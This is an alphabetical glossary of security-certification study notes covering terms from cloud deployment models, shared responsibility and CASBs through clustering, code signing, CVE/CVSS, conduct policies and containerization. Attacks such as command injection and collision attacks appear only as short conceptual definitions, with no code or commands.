Cloud Deployment Model - Classifying the ownership and management of a cloud as public, private, community, or hybrid.

A cloud deployment model classifies how the service is owned and provisioned. It is important to recognize that deployment models have different impacts on threats and vulnerabilities. Cloud deployment models can be broadly categorized as follows:

1. Public (or multi-tenant) - Is a service offered over the Internet by cloud service providers (CSPs) to cloud consumers. With this model, businesses can offer subscriptions or pay-as-you-go financing, while at the same time providing lower-tier services free of charge. As a shared resource, there are risks regarding performance and security. Multi-cloud architectures are where an organization uses services from multiple CSPs.

2. Hosted Private — Is hosted by a third party for the exclusive use of the organization. This is more secure and can guarantee better performance but is correspondingly more expensive.
Private—cloud infrastructure that is completely private to and owned by the organization. In this case, there is likely to be one business unit dedicated to managing the cloud while other business units make use of it. With private cloud computing, organizations exercise greater control over the privacy and security of their services. This type of delivery method is geared more toward banking and governmental services that require strict access control in their operations.

A private cloud could be on-premises or off-site relative to the other business units. An on-site link can obviously deliver better performance and is less likely to be subject to outages (loss of an Internet link, for instance). On the other hand, a dedicated off-site facility may provide better shared access for multiple users in different locations.

3. Community - Is where several organizations share the costs of either a hosted private or fully private cloud. This is usually done in order to pool resources for a common concern, like standardization and security policies.
There will also be cloud computing solutions that implement a hybrid public/private/community/hosted/on-site/off-site solution. For example, a travel organization may run a sales website for most of the year using a private cloud but break out the website to a public cloud when much higher utilization is forecast.

Flexibility is a key advantage of cloud computing, but the implications for data risk must be well understood when moving data between private and public storage environments.

Security Considerations
Different cloud architecture models have varying security implications to consider when deciding which one to use.

1. Single-tenant architecture - Provides dedicated infrastructure to a single customer, ensuring that only that customer can access the infrastructure. This model offers the highest level of security as the customer has complete control over the infrastructure. However, it can be more expensive than multi-tenant architecture, and the customer is responsible for managing and securing the infrastructure.

2. Multi-tenant architecture - Is when multiple customers share the same infrastructure, with each customer's data and applications separated logically from other customers. This model is cost-effective but can increase the risk of unauthorized access or data leakage if not properly secured.

3. Hybrid architecture - Uses public and private cloud infrastructure. This model provides greater flexibility and control over sensitive data and applications by allowing customers to store sensitive data on private cloud infrastructure while using public cloud infrastructure for less sensitive workloads. However, it also requires careful management to ensure proper integration and security between the public and private clouds.

4. Serverless architecture - Is when the cloud provider manages the infrastructure and automatically scales resources up or down based on demand. This model can be more secure than traditional architectures because the cloud provider manages and secures the infrastructure. However, customers must still take steps to secure access to their applications and data.

Hybrid Cloud
A hybrid cloud most commonly describes a computing environment combining public and private cloud infrastructures, although any combination of cloud infrastructures constitutes a hybrid cloud. In a hybrid cloud, companies can store data in a private cloud but also leverage the resources of a public cloud when needed. This allows for greater flexibility and scalability, as well as cost savings. A hybrid cloud is commonly used because it enables companies to take advantage of the benefits of both private and public clouds. Private clouds can provide greater security and control over data, while public clouds offer more cost-effective scalability and access to a broader range of resources. A hybrid cloud also allows for a smoother transition to the cloud for companies that may need more time to migrate all of their data.

A hybrid cloud also presents security challenges, such as managing multiple cloud environments and enforcing consistent security policies. One issue is the complexity of managing multiple cloud environments and integrating them with on-premises infrastructure, which can create security gaps and increase the risk of data breaches. Another concern is the potential for unauthorized access to data and applications, particularly when sensitive information is stored in the public cloud. There are often mistakes caused by confusion over the boundary between on-premises and public cloud infrastructure. Additionally, using multiple cloud providers can make it challenging to enforce consistent security policies across all environments.

A hybrid cloud infrastructure can provide data redundancy features, such as replicating data across on-premises and cloud infrastructure. Data protection can be achieved through redundancy, but it can also lead to issues with data consistency stemming from synchronization problems among multiple locations. Considering that legal compliance is a critical concern when implementing any type of cloud environment, organizations must ensure that data stored in both the on-premises and cloud components of the hybrid environment comply with these mandates. This adds additional complexity to data governance and security operations.

Another consideration is the establishment and enforcement of service-level agreements (SLAs). SLAs formally outline all performance, availability, and support expectations between the cloud service provider and the organization. Guaranteeing expected levels of service can be challenging when dealing with the integration of different cloud and on-premises systems. Other concerns related to the hybrid cloud include the potential for increased network latency due to large data transfer volumes between on-premises and cloud environments that impact application performance, and monitoring the hybrid environment can be more complex due to the requirement for specialized expertise and tools.
Cloud Models Security - Different cloud architecture models have varying security implications to consider when deciding which one to use.

1. Single-tenant architecture - Provides dedicated infrastructure to a single customer, ensuring that only that customer can access the infrastructure. This model offers the highest level of security as the customer has complete control over the infrastructure. However, it can be more expensive than multi-tenant architecture, and the customer is responsible for managing and securing the infrastructure.

2. Multi-tenant architecture - Is when multiple customers share the same infrastructure, with each customer's data and applications separated logically from other customers. This model is cost-effective but can increase the risk of unauthorized access or data leakage if not properly secured.

3. Hybrid architecture - Uses public and private cloud infrastructure. This model provides greater flexibility and control over sensitive data and applications by allowing customers to store sensitive data on private cloud infrastructure while using public cloud infrastructure for less sensitive workloads. However, it also requires careful management to ensure proper integration and security between the public and private clouds.

4. Serverless architecture - Is when the cloud provider manages the infrastructure and automatically scales resources up or down based on demand. This model can be more secure than traditional architectures because the cloud provider manages and secures the infrastructure. However, customers must still take steps to secure access to their applications and data.
Cloud Responsibility Matrix - Identifies that responsibility for the implementation of security as applications, data, and workloads are transitioned into a cloud platform are shared between the customer and the cloud service provider (CSP).

When using cloud infrastructure, security risks are not transferred but shared between the cloud provider and the customer. The cloud provider is responsible for securing the underlying infrastructure while the customer is responsible for securing their applications and data. Choosing a cloud provider that offers robust security features such as encryption, access controls, and network security is important.

The shared responsibility model describes the balance of responsibility between a customer and a cloud service provider (CSP) for implementing security in a cloud platform. The division of responsibility becomes more or less complicated based on whether the service model is SaaS, PaaS, or IaaS. For example, in a SaaS model, the CSP performs the operating system configuration and control as part of the service offering. In contrast, operating system security is shared between the CSP and the customer in an IaaS model.

In general terms, the responsibilities of the customer and the cloud provider include the following areas:

1. Cloud Service Provider
Physical security of the infrastructure
Securing computer, storage, and network equipment
Securing foundational elements of networking, such as DDoS protection
Cloud storage backup and recovery
Security of cloud infrastructure resource isolation among tenants
Tenant resource identity and access control
Security, monitoring, and incident response for the infrastructure
Securing and managing the datacenters located in multiple geographic regions

2. Cloud Service Customer
User identity management
Configuring the geographic location for storing data and running services
User and service access controls to cloud resources
Data and application security configuration
Protection of operating systems, when deployed
Use and configuration of encryption, especially the protection of keys
As previously stated, the division of responsibility becomes more/less complicated based on the service model used. For example, in a SaaS model, the configuration and control of networking is performed by the CSP as part of the service offering. In an IaaS model, the responsibility for network configuration is shared between the CSP and the customer.

An important core concept when using cloud resources is that the implementation and management of security controls is not a "hands-off" endeavor, and identifying the boundary between customer and CSP responsibilities requires a conscious effort.

Identifying the boundary between customer and cloud provider responsibilities, in terms of security, is imperative for reducing the risk of introducing vulnerabilities into your environment.
Cloud Responsiveness - Load balancing, edge computing, and auto-scaling are critical mechanisms to ensure responsiveness, improve performance, and effectively handle fluctuating workloads.

1. Load Balancing - Distributes network traffic across multiple servers or services to improve performance and provide high availability. In the cloud, load balancers are intermediaries (proxies) between users and back-end resources like virtual machines or containers. They distribute incoming requests to different resources using sophisticated algorithms and handle server capacity, response time, and workload.

2. Edge Computing - Optimizes the geographic location of resources and services to enable faster processing and reduced latency. Instead of routing all data to a centralized cloud datacenter, edge computing utilizes distributed computing resources to minimize the distance data needs to travel, reducing network latency and improving responsiveness. Edge computing is particularly beneficial for applications that require real-time or low-latency processing, such as IoT devices, content delivery networks (CDNs), and latency-sensitive applications.

3. Auto-Scaling - Is an automated process that adjusts the computing resources allocated to an application based on demand. Auto-scaling allows cloud infrastructure to dynamically scale resources up or down to match the real-time workload requirements. For example, during periods of high demand, additional resources are provisioned automatically to handle the increased load, ensuring optimal performance and responsiveness. In contrast, when demand decreases, unnecessary resources are released back into a shared pool to reduce operating costs or to make them available to other workloads.
Cloud Security - 1. Data protection - Data and applications are stored outside of an organization's privately managed infrastructure and are essentially stored "on the Internet" which means that configuration mistakes can have disastrous consequences. Taking careful precautions to protect data using access controls and encryption is essential. Additionally, disaster recovery plans must still be developed in response to any catastrophic events that impact the availability of cloud resources.

2. Patching - Cloud providers should have a clear policy regarding patch management, including how often patches are released and how quickly the provider will respond to critical vulnerabilities. Additionally, it's essential to consider how easy it is to apply patches to applications and systems running on the cloud infrastructure. Patch availability can be ensured through various features, including automated patch management, regular software updates, centralized patch management, security monitoring, third-party software support. Having a plan for testing and deploying patches ensures systems do not experience unplanned downtime and remain secure.

Several factors can make patching cloud infrastructures difficult or even impossible to accomplish consistently. One common challenge is the complexity of cloud systems, which can make it difficult to identify and address vulnerabilities. Additionally, some cloud providers may not allow customers to modify the underlying infrastructure, making it impossible to install patches directly. In a cloud environment, the cloud service provider manages the underlying infrastructure. This lack of control can make it difficult or even impossible to apply patches according to legal and regulatory requirements or timelines.

3. Secure Communication and Access

i. A Software-Defined Wide Area Network (SD-WAN) enables organizations to connect their various branch offices, datacenters, and cloud infrastructure over a wide area network (WAN). One of the key advantages of SD-WAN is its ability to provide enhanced security features and considerations. For example, SD-WAN uses encryption to protect data as it travels across the network and can segment network traffic based on priority ratings to ensure that critical data is fully protected.

Additionally, SD-WAN can intelligently route traffic based on the application and tightly integrate with firewalls to provide additional protection against known threats. SD-WAN centralizes the management of network security policies to simplify enforcing security measures across an entire network.

ii. Secure Access Service Edge (SASE) combines the protection of a secure access platform with the agility of a cloud-delivered security architecture. SASE offers a centralized approach to security and access, providing end-to-end protection and streamlining the process of granting secure access to all users, regardless of location. SASE is a network architecture that combines wide area networking (WAN) technologies and cloud-based security services to provide secure access to cloud-based applications and services.

SASE offers several security features to help organizations protect their networks and data as SASE operates under a zero trust security model. SASE incorporates Identity and Access Management (IAM) and assumes all users and devices are untrusted until they are authenticated and authorized. SASE also provides a range of threat prevention features, such as intrusion prevention, malware protection, and content filtering.
Cloud Service Customer Responsibility - User identity management
Configuring the geographic location for storing data and running services
User and service access controls to cloud resources
Data and application security configuration
Protection of operating systems, when deployed
Use and configuration of encryption, especially the protection of keys
Cloud Service Model - Classifying the provision of cloud services and the limit of the cloud service provider's responsibility as software, platform, infrastructure, and so on.

As well as the ownership model (public, private, hybrid, or community), cloud service models are often differentiated on their level of complexity and the amount of pre-configuration provided. These models are referred to as something or anything as a service (XaaS). The three most common implementations are infrastructure, software, and platform.

Software as a Service
Software as a service (SaaS) is a model of provisioning software applications. Rather than purchasing software licenses for a given number of seats, a business accesses software hosted on a supplier's servers on a pay-as-you-go or lease arrangement (on-demand). The virtual infrastructure allows developers to provision on-demand applications much more quickly than previously. The applications are developed and tested in the cloud without the need to test and deploy on client computers. Examples include Microsoft Office 365, Salesforce, and Google G Suite.

Platform as a Service
Platform as a service (PaaS) provides resources somewhere between SaaS and IaaS. A typical PaaS solution would provide servers and storage network infrastructure (as per IaaS) but also provide a multi-tier web application/database platform on top. This platform could be based on Oracle and MS SQL or PHP and MySQL. Examples include Oracle Database, Microsoft Azure SQL Database, and Google App Engine.

Distinct from SaaS, this platform would not be configured to do anything. Your developers would create the software (the CRM or e‑commerce application) that runs using the platform. The service provider would be responsible for the integrity and availability of the platform components, and you would be responsible for the security of the application you created on the platform.

Infrastructure as a Service
Infrastructure as a service (IaaS) is a means of provisioning IT resources such as servers, load balancers, and storage area network (SAN) components quickly. Rather than purchase these components and the Internet links they require, you rent them as needed from the service provider's datacenter. Examples include Amazon Elastic Compute Cloud, Microsoft Azure Virtual Machines, Oracle Cloud, and OpenStack.

Third-Party Vendors
Third-party vendors are external entities that provide organizations with goods, services, or technology solutions. In cloud computing, third-party vendors refer to the providers offering cloud services to businesses using infrastructure-, platform-, or software-as-a-service models. As a third party, careful consideration regarding cloud service provider selection, contract negotiation, service performance, compliance, and communication practices is paramount. Organizations must adopt robust vendor management strategies to mitigate cloud platform risks, ensure service quality, and optimize cloud deployments. Service-level agreements (SLAs) are contractual agreements between organizations and cloud service providers that outline the expected levels of service delivery. SLAs define metrics, such as uptime, performance, and support response times, along with penalties or remedies if service levels are not met. SLAs provide a framework to hold vendors accountable for delivering services at required performance levels.

Organizations must assess the security practices implemented by vendors to protect their sensitive data, including data encryption, access controls, vulnerability management, incident response procedures, and regulatory compliance, and are responsible for ensuring compliance with data privacy requirements, especially if they handle personally identifiable information (PII) or operate in regulated industries. Vendor lock-in makes switching to alternative vendors or platforms challenging or impossible, and so organizations must carefully evaluate data portability, interoperability, and standardization to mitigate vendor lock-in risks. Strategies like multi-cloud or hybrid cloud deployments can provide flexibility and reduce reliance on a single vendor.
Cloud Service Provider (CSP) - Organization providing infrastructure, application, and/or storage services via an "as a service" subscription-based, cloud-centric offering.
Cloud Service Provider Responsibility - Physical security of the infrastructure
Securing computer, storage, and network equipment
Securing foundational elements of networking, such as DDoS protection
Cloud storage backup and recovery
Security of cloud infrastructure resource isolation among tenants
Tenant resource identity and access control
Security, monitoring, and incident response for the infrastructure
Securing and managing the datacenters located in multiple geographic regions
Cloud-based Application Attacks - Cloud-based application attacks target applications hosted on cloud platforms and exploit potential vulnerabilities within these applications or the cloud infrastructure they run on to carry out malicious activities. Cloud-based application attacks generally involve the exploitation of misconfigurations in the cloud environment, weak authentication mechanisms, insufficient network segmentation, or poorly implemented access controls.

Compared to traditional application attacks, cloud-based attacks have some unique characteristics. In a cloud environment, the shared responsibility model can lead to confusion about who is responsible for what, potentially leaving security gaps that attackers can exploit.

The highly accessible and scalable nature of the cloud can make cloud-based applications attractive targets for attackers. For example, an attacker may exploit a vulnerability in a cloud-based application resulting in access to other resources within the same cloud environment, providing access to infrastructure in ways typically impossible with traditional application attacks.

Some attack types are largely specific to the cloud, such as side-channel attacks, where an attacker with an instance running on the same physical server as the victim attempts to extract information from the victim's instance via shared resources. Attackers can exploit misconfigurations and weak security controls in cloud environments to gain unauthorized access to sensitive data in improperly secured cloud storage buckets.

Cloud services can also be used for cryptojacking, where an attacker uses the cloud's processing power to mine cryptocurrency without the user's consent, leading to (vastly) increased costs for the cloud user and degraded performance of their provisioned resources.

Cloud as an Attack Platform
Attackers can also use cloud platforms for phishing and malware distribution. They can easily set up fraudulent websites that mimic legitimate ones on cloud services and use these sites to trick users into revealing sensitive information. In addition, they can exploit cloud storage services to host malicious files and then distribute these files via phishing emails or other means.

Cloud Access Security Brokers
A cloud access security broker (CASB - Enterprise management software designed to mediate access to cloud services by users across all types of devices) is enterprise management software designed to mediate access to cloud services by users across all types of devices. CASB vendors include Symantec, Skyhigh Security, Forcepoint, Microsoft Cloud App Security, and Cisco Cloudlock.

CASBs provide visibility into how clients and other network nodes are using cloud services. Some of the functions of a CASB are the following:

1. Enable single sign-on authentication and enforce access controls and authorizations from the enterprise network to the cloud provider.

2. Scan for malware and rogue or noncompliant device access.

3. Monitor and audit user and resource activity.

4. Mitigate data exfiltration by preventing access to unauthorized cloud services from managed devices.

In general, CASBs are implemented in one of three ways:

1. Forward proxy - Is a security appliance or host positioned at the client network edge that forwards user traffic to the cloud network if the contents of that traffic comply with a policy. This requires configuration of users' devices or installation of an agent. In this mode, the proxy can inspect all traffic in real time, even if that traffic is not bound for sanctioned cloud applications. The problem with this mode is that users may be able to evade the proxy and connect directly. Proxies are also associated with poor performance as without a load balancing solution, they become a bottleneck and potentially a single point of failure.

2. Reverse proxy - Is positioned at the cloud network edge and directs traffic to cloud services if the contents of that traffic comply with a policy. This does not require configuration of the users' devices. This approach is only possible if the cloud application has proxy support.

3. Application programming interface (API) - Brokers connections between the cloud service and the cloud consumer rather than placing a CASB appliance or host inline with cloud consumers and the cloud services. For example, if a user account has been disabled or an authorization has been revoked on the local network, the API-based CASB would communicate this to the cloud service and use its API to disable access there too. This depends on the API supporting the range of functions that the CASB and access and authorization policies demand. CASB solutions are quite likely to use both proxy and API modes for different security management purposes.
Clustering - A load balancing technique where a group of servers are configured as a unit and work together to provide network services.

Where load balancing distributes traffic between independent processing nodes, clustering allows multiple redundant processing nodes that share data with one another to accept connections. This provides redundancy. If one of the nodes in the cluster stops working, connections can failover (A technique that ensures a redundant component, device, or application can quickly and efficiently take over the functionality of an asset that has failed) to a working node. To clients, the cluster appears to be a single server. A load balancer distributes client requests across available server nodes in a farm or pool and is generally associated with managing web traffic whereas clusters are used to provide redundancy and high-availability for systems such as databases, file servers and others.

Virtual IP
For example, an organization might want to provision two load balancer appliances so that if one fails, the other can still handle client connections. Unlike load balancing with a single appliance, the public IP used to access the service is shared between the two instances in the cluster. This arrangement is referred to as a virtual IP or shared or floating address. The instances are configured with a private connection, on which each is identified by its "real" IP address. This connection runs a redundancy protocol, such as Common Address Redundancy Protocol (CARP), enabling the active node to "own" the virtual IP and respond to connections. The redundancy protocol also implements a heartbeat mechanism to allow failover to the passive node if the active one should suffer a fault.

Active/Passive (A/P) and Active/Active (A/A) Clustering
In the previous example, if one node is active, the other is passive. This is referred to as active/passive clustering. The biggest advantage of active/passive configurations is that performance is not adversely affected during failover. However, there are higher hardware and operating system costs because of the unused capacity.

An active/active cluster means that both nodes are processing connections concurrently. This allows the administrator to use the maximum capacity from the available hardware while all nodes are functional. In the event of a failover, the workload of the failed node is immediately and transparently shifted onto the remaining node. At this time, the workload on the remaining nodes is higher and performance is degraded.

N+1 and N+M Configurations: In a standard active/passive configuration, each active node must be matched by a passive node. To reduce the costs associated with passive nodes, N+1 and N+M configurations are used:

1. N+1 Configuration: Here, a single passive node is shared among multiple active nodes. For example, with five active nodes, instead of having five passive nodes, only one passive node is provisioned to take over for any of the active nodes that might fail. This setup significantly reduces the number of passive nodes needed.

2. N+M Configuration: In this setup, multiple passive nodes are shared among multiple active nodes. For instance, with ten active nodes, there might be two or three passive nodes available. These passive nodes can take over in case of failures, offering a balance between redundancy and cost-efficiency.

Application Clustering
Clustering is also very commonly used to provision fault-tolerant application services. If an application server suffers a fault in the middle of a session, the session state data will be lost. Application clustering allows servers in the cluster to communicate session information to one another. For example, if a user logs in on one instance, the next session can start on another instance, and the new server can access the cookies or other information used to establish the login.
Code of Conduct - Professional behavior depends on basic ethical standards, such as honesty and fairness. Some professions may have developed codes of ethics to cover difficult situations; some businesses may also have a code of ethics to communicate the values it expects its employees to practice.

A code of conduct, or rules of behavior, sets out expected professional standards. For example, employees' use of social media and file sharing poses substantial risks to the organization, including threat of virus infection or systems intrusion, lost work time, copyright infringement, and defamation. Users should be aware that any data communications, such as email, made through an organization's computer system are likely stored within the system, on servers, backup devices, and so on. Such communications are also likely to be logged and monitored. Employers may also subject employees' personal social media accounts to analysis and monitoring, to check for policy infringements.

Rules of behavior are also important when considering employees with privileged access to computer systems. Technicians and managers should be bound by clauses that forbid them from misusing privileges to snoop on other employees or to disable a security mechanism.
Code Signing - The method of using a digital signature to ensure the source and integrity of programming code.

Code signing practices use digital signatures to verify the integrity and authenticity of software code. Code signing serves a dual purpose: ensuring that software has not been tampered with since signing and confirming the software publisher's identity.

When software is digitally signed, the signer uses a private key to encrypt a hash or digest of the code—this encrypted hash and the signer's identity form the digital signature. Code signing requires using a certificate issued by a trusted certificate authority (CA). The certificate contains information about the signer's identity and is critical for verifying the digital signature. If the certificate is valid and issued by a trusted CA, the software publisher's identity can be confidently verified. Code signing helps analysts and administrators block untrusted software and also helps protect software publishers by providing a mechanism to validate the authenticity of their code. Overall, code signing helps build trust in the software distribution process.

While code signing provides assurance about the origin of code and verifies code integrity, it does not inherently assure the safety or security of the code itself. Code signing certifies the source and integrity of the code, but it doesn't evaluate the quality or security of the code. The signed code could still contain bugs, vulnerabilities, or malicious code inserted by the original author. Signing ensures software is from the expected developer and in the state the developer intended. While code signing adds trust and authenticity to software distribution, it should not be relied upon to guarantee secure or bug-free code.
Cold Site - A predetermined alternate location where a network can be rebuilt after a disaster. A cold site takes longer to set up. A cold site may be an empty building with a lease agreement in place to install whatever equipment is required when necessary.
Collision Attack - In cryptography, the act of two different plaintext inputs producing the same exact ciphertext output.

A collision is where a weak cryptographic hashing function or implementation allows the generation of the same digest value for two different plaintexts. A collision attack exploits this vulnerability to forge a digital signature. The attack works as follows:

1. The attacker creates a malicious document and a benign document that produce the same hash value. The attacker submits the benign document for signing by the target.

2. The attacker then removes the signature from the benign document and adds it to the malicious document, forging the target's signature.

A collision attack could be used to forge a digital certificate to spoof a trusted website or to make it appear as though Trojan malware derived from a trusted publisher.
Command and Control (C2 or C&C) - Infrastructure of hosts and services with which attackers direct, distribute, and control malware over botnets.
Command Injection Attack - Where a threat actor is able to execute arbitrary shell commands on a host via a vulnerable web application.

A command injection attack attempts to cause the server to run OS shell commands and return the output to the browser. As with directory traversal, the web server should normally be able to prevent commands from operating outside of the server's directory root and to prevent commands from running with any privilege level other than the web server's "guest" user (which is normally granted only very restricted privileges). A successful command injection attack would find some way of circumventing this security, or exploit a web server that is not properly configured.
Common Name (CN) - An X500 attribute expressing a host or username, also used as the subject identifier for a digital certificate.

When certificates were first introduced, the common name (CN) attribute was used to identify the fully qualified domain name (FQDN) by which the server is accessed, such as www.comptia.org. This usage grew by custom rather than design, however. The CN attribute can contain different kinds of information, making it difficult for a browser to interpret it correctly. Consequently, the CN attribute is now deprecated as a method of validating a subject identity that needs to resolve to some type of network address.
Common Vulnerabilities and Exposures (CVE) - An automated scanner needs to be kept up to date with information about known vulnerabilities. This information is often described as a vulnerability feed (A synchronizable list of data and scripts used to check for vulnerabilities. Also referred to as plug-ins or network vulnerability tests NVTs), though the Nessus tool refers to these feeds as plug-ins, and OpenVAS refers to them as network vulnerability tests (NVTs). Often, the vulnerability feed forms an important part of scan vendors' commercial models because the latest updates require a valid subscription.

The National Vulnerability Database (NVD) is a repository maintained by the National Institute of Standards and Technology (NIST) that provides detailed information about known software vulnerabilities, including vulnerability descriptions, severity ratings, affected software versions, and mitigation measures. https://nvd.nist.gov

Vulnerability feeds use common identifiers to facilitate sharing of intelligence data across different platforms. Many vulnerability scanners use the Security Content Automation Protocol (SCAP - A NIST framework that outlines various accepted practices for automating vulnerability scanning) to obtain feed or plug-in updates.

As well as providing a mechanism for distributing the feed, SCAP defines ways to compare the actual configuration of a system to a target-secure baseline plus various systems of common identifiers. These identifiers supply a standard means for different products to refer to a vulnerability or platform consistently.

Common Vulnerabilities and Exposures (CVE - A scheme for identifying vulnerabilities developed by MITRE and adopted by NIST) is a dictionary of vulnerabilities in published operating systems and applications software. The elements that make up a vulnerability's entry in the CVE include:

1. An identifier in the format: CVE-YYYY-####, where YYYY is the year the vulnerability was discovered and #### is at least four digits that indicate the order in which the vulnerability was discovered.

2. A brief description of the vulnerability.

3. A reference list of URLs that supply more information on the vulnerability.

4. The date the vulnerability entry was created.

The CVE dictionary provides the principal input for NIST's National Vulnerability Database. The NVD supplements the CVE descriptions with additional analysis, a criticality metric calculated using the Common Vulnerability Scoring System (CVSS - A risk management approach to quantifying vulnerability data and then taking into account the degree of risk to different types of systems or information) plus fix information.

The Forum of Incident Response and Security Teams maintains the CVSS. CVSS metrics generate a score from 0 to 10 based on the characteristics of the vulnerability, such as whether it can be triggered remotely or needs local access, whether user intervention is required, and so on. The scores are banded into descriptions as follows:

0.1+ = Low
4.0+ = Medium
7.0+ = High
9.0+ = Critical
Common Vulnerability Scoring System (CVSS) - A risk management approach to quantifying vulnerability data and then taking into account the degree of risk to different types of systems or information.

The Forum of Incident Response and Security Teams maintains the CVSS. CVSS metrics generate a score from 0 to 10 based on the characteristics of the vulnerability, such as whether it can be triggered remotely or needs local access, whether user intervention is required, and so on. The scores are banded into descriptions as follows:

0.1+ = Low
4.0+ = Medium
7.0+ = High
9.0+ = Critical
Community Cloud - A cloud that is deployed for shared use by cooperating tenants.

It is where several organizations share the costs of either a hosted private or fully private cloud. This is usually done in order to pool resources for a common concern, like standardization and security policies.
Compensating Security Control - A security measure that takes on risk mitigation when a primary control fails or cannot completely meet expectations. The control is a substitute for a primary control, as recommended by a security standard, and affords the same (or better) level of protection but uses a different methodology or technology. This could include using network segmentation so that only specific hosts can communicate with a critical legacy system that can no longer be patched for security vulnerabilities.
Compliance Monitoring - Compliance with legal and regulatory requirements, industry standards, and internal policies can be ensured through diligent monitoring of an organization's actions. This involves conducting thorough investigations and assessments of third parties, such as vendors or business partners, to ensure they comply with relevant regulations.

Moreover, taking reasonable precautions and implementing necessary controls to protect sensitive information and prevent noncompliance is essential. Attestation and acknowledgment are also integral to compliance monitoring, requiring individuals or entities to formally acknowledge their understanding of compliance obligations and commitment to adhere to them through signed agreements, policy acknowledgments, and training activities. This provides evidence of an individual or organization's commitment to compliance and serves as the foundation for monitoring and enforcement. Compliance monitoring can be conducted internally or externally, with self-assessments, internal audits, and reviews conducted internally and independent audits, assessments, or regulatory inspections conducted externally. Automation is vital in compliance monitoring, with compliance management software being a critical tool in data collection, analysis, and reporting. Automation streamlines monitoring activities, improves accuracy, and enhances the ability to detect noncompliance or anomalies promptly.
Computer Incident Response Team (CIRT) - Team with responsibility for incident response. The CIRT must have expertise across a number of business domains (IT, HR, legal, and marketing, for instance). A dedicated computer incident response team (CIRT) is a single point of contact for the notification of security incidents. This function might be handled by the SOC or it might be established as an independent business unit. CIRT is also known as Computer Security Incident Response Team (CSIRT) and Computer Emergency Response Team (CERT).
Computer-based Training (CBT) - Training and education programs delivered using computer devices and e-learning instructional models and design.
Concurrent Session Usage - A potential indicator of malicious activity where an account has started multiple sessions on one or more hosts. This indicates that the threat actor has obtained the account credentials and is signed in on another workstation or over a remote access connection.
Conduct Policies - Operational policies include privilege/credential management, data handling, and incident response. Other important security policies include those governing employee conduct and respect for privacy.

Acceptable Use Policy
Enforcing an acceptable use policy (AUP - A policy that governs employees' use of company equipment and Internet services. ISPs may also apply AUPs to their customers) is important to protect the organization from the security and legal implications of employees misusing its equipment. Typically, the policy will forbid the use of equipment to defraud, defame, or to obtain illegal material. It will prohibit the installation of unauthorized hardware or software and explicitly forbid actual or attempted snooping of confidential data that the employee is not authorized to access. Acceptable use guidelines must be reasonable and not interfere with employees' fundamental job duties or privacy rights. An organization's AUP may forbid use of Internet tools outside of work-related duties or restrict such use to break times.

Code of Conduct and Social Media Analysis
A code of conduct (Professional behavior depends on basic ethical standards, such as honesty and fairness. Some professions may have developed codes of ethics to cover difficult situations; some businesses may also have a code of ethics to communicate the values it expects its employees to practice), or rules of behavior, sets out expected professional standards. For example, employees' use of social media and file sharing poses substantial risks to the organization, including threat of virus infection or systems intrusion, lost work time, copyright infringement, and defamation. Users should be aware that any data communications, such as email, made through an organization's computer system are likely stored within the system, on servers, backup devices, and so on. Such communications are also likely to be logged and monitored. Employers may also subject employees' personal social media accounts to analysis and monitoring, to check for policy infringements.

Rules of behavior are also important when considering employees with privileged access to computer systems. Technicians and managers should be bound by clauses that forbid them from misusing privileges to snoop on other employees or to disable a security mechanism.

Use of Personally Owned Devices in the Workplace
Portable devices, such as smartphones, USB sticks, media players, and so on, pose a considerable threat to data security, as they make file copying so easy. Camera and voice-recording functions are other obvious security issues. Network access control, endpoint management, and data loss prevention solutions can be of some use in preventing the attachment of such devices to corporate networks. Some companies may try to prevent staff from bringing such devices on-site. This is quite difficult to enforce, though.

Also important to consider is the unauthorized use of personal software by employees or employees using software or services that has not been sanctioned for a project (shadow IT). Personal software may include either locally installed software or hosted applications, such as personal email or instant messenger, and may leave the organization open to a variety of security vulnerabilities. Such programs may provide a route for data exfiltration, a transport mechanism for malware, or possibly software license violations for which the company might be held liable, just to name a few of the potential problems.

Clean Desk Policy
A clean desk policy (An organizational policy that mandates employee work areas be free from potentially sensitive information; sensitive documents must not be left out where unauthorized personnel might see them) means that each employee's work area should be free from any documents left there. The aim of the policy is to prevent sensitive information from being obtained by unauthorized staff or guests at the workplace.
Confidential Data - The information is sensitive but can be declassified, suitable for viewing only by personnel within the organization and possibly by trusted third parties under conditions such as NDAs. This classification does not necessarily include information requiring protection at the national security level.
Confidentiality - The fundamental security goal of keeping information and communications private and protecting them from unauthorized access. Confidentiality means that information can only be read by people who have been explicitly authorized to access it.
Confidentiality (Authentication) - In terms of authentication, is critical, because if account credentials are leaked, threat actors can impersonate the account holder and act on the system with whatever rights they have.
Configuration Baselines - Settings for services and policy configuration for a network appliance or for a server operating in a particular application role (web server, mail server, file/print server, and so on).
Configuration Item (CI) - A Configuration Item (CI) is an asset that requires specific management procedures to be used to deliver the service. Each CI must be labeled, ideally using a standard naming convention. CIs are defined by their attributes and relationships stored in a configuration management database (CMDB).
Configuration Management - A process through which an organization's information systems components are kept in a controlled state that meets the organization's requirements, including those for security and compliance.

Configuration management ensures that each configurable element within an asset inventory has not diverged from its approved configuration.
Configuration management system (CMS) - A configuration management system (CMS) describes the tools and databases used to collect, store, manage, update, and report information about CIs. A small network might capture this information in spreadsheets and diagrams, whereas a large organization may invest in dedicated applications designed for enterprise environments.
Conflict of Interest - When an individual or organization has investments or obligations that could compromise their ability to act objectively, impartially, or in the best interest of another party.

A conflict of interest arises when an individual or organization has competing interests or obligations that could compromise their ability to act objectively, impartially, or in the best interest of another party. When performing vendor assessments, it is vital to determine whether a vendor's interests, relationships, or affiliations may influence their ability to provide unbiased recommendations, fair pricing, or deliver services without bias. Organizations must diligently identify and address potential conflicts of interest, including scrutinizing the vendor's affiliations, relationships with competitors or stakeholders, financial interests, and any potential bias that could compromise their integrity. Some examples of conflict of interest include the following items:

1. Financial Interests - A vendor may have a financial interest in recommending specific products or services due to partnerships, commissions, or financial incentives that bias their recommendations and lead to selecting options that may not fit the organization's needs.

2. Personal Relationships - If a vendor has personal relationships or close ties with decision-makers within the organization, it can influence decision-making and compromise the objective evaluation of other vendors.

3. Competitive Relationships - A vendor may have a business relationship or competitive interest with another vendor under consideration, which can lead a vendor to prioritize their own interests or partnerships over the organization's best interests.

4. Insider Information - In cases where a vendor has access to confidential or proprietary information about other vendors or the organization's strategic plans, the vendor may use this information to gain an unfair advantage or manipulate the selection process.
Containerization / Container Virtualization - An operating system virtualization deployment containing everything required to run a service, application, or microservice.

Containerization is a powerful technology that has transformed application packaging and deployment. Containers encapsulate all necessary components for software, including code, libraries, and configurations, within a portable unit termed a "container." Isolating software in this way ensures consistent application behavior regardless of the underlying platform on which it runs. Software containers parallel the use of physical containers utilized in the shipping industry.

